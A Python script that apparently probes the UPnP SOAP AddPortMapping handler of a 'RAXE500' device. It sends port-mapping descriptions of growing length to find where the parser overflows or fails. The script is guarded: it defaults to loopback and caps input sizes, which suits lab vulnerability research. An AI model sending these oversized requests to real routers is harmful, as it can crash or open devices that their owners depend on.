#!/usr/bin/env python3
"""Bounded, loopback-default reachability probe for the RAXE500 UPnP parser."""

import argparse
import http.client
import ipaddress


SIZES = (16, 64, 72, 80, 96, 128, 256, 512, 1024, 1600, 2048)
SOAP_TEMPLATE = """<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"
 s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
 <s:Body>
  <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
   <NewRemoteHost></NewRemoteHost><NewExternalPort>54321</NewExternalPort>
   <NewProtocol>TCP</NewProtocol><NewInternalPort>54321</NewInternalPort>
   <NewInternalClient>192.168.1.2</NewInternalClient><NewEnabled>1</NewEnabled>
   <NewPortMappingDescription>{value}</NewPortMappingDescription>
   <NewLeaseDuration>0</NewLeaseDuration>
  </u:AddPortMapping>
 </s:Body>
</s:Envelope>"""


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=56688)
    parser.add_argument("--path", default="/Public_UPNP_C3")
    parser.add_argument(
        "--sizes", default=",".join(str(size) for size in SIZES),
        help="comma-separated description lengths",
    )
    parser.add_argument("--allow-non-loopback", action="store_true")
    args = parser.parse_args()

    address = ipaddress.ip_address(args.host)
    if not address.is_loopback and not args.allow_non_loopback:
        parser.error("non-loopback target refused; use an isolated lab and opt in explicitly")

    headers = {
        "Content-Type": 'text/xml; charset="utf-8"',
        "SOAPAction": '"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"',
    }
    sizes = tuple(int(value) for value in args.sizes.split(",") if value)
    if not sizes or any(size < 1 or size > 2048 for size in sizes):
        parser.error("sizes must contain integers from 1 through 2048")
    for size in sizes:
        body = SOAP_TEMPLATE.format(value="A" * size).encode()
        connection = http.client.HTTPConnection(args.host, args.port, timeout=3)
        try:
            connection.request("POST", args.path, body=body, headers=headers)
            response = connection.getresponse()
            response.read()
            print(f"size={size} status={response.status} reason={response.reason}")
        except (ConnectionError, TimeoutError, OSError) as error:
            print(f"size={size} connection_failed={error}")
            break
        finally:
            connection.close()


if __name__ == "__main__":
    main()
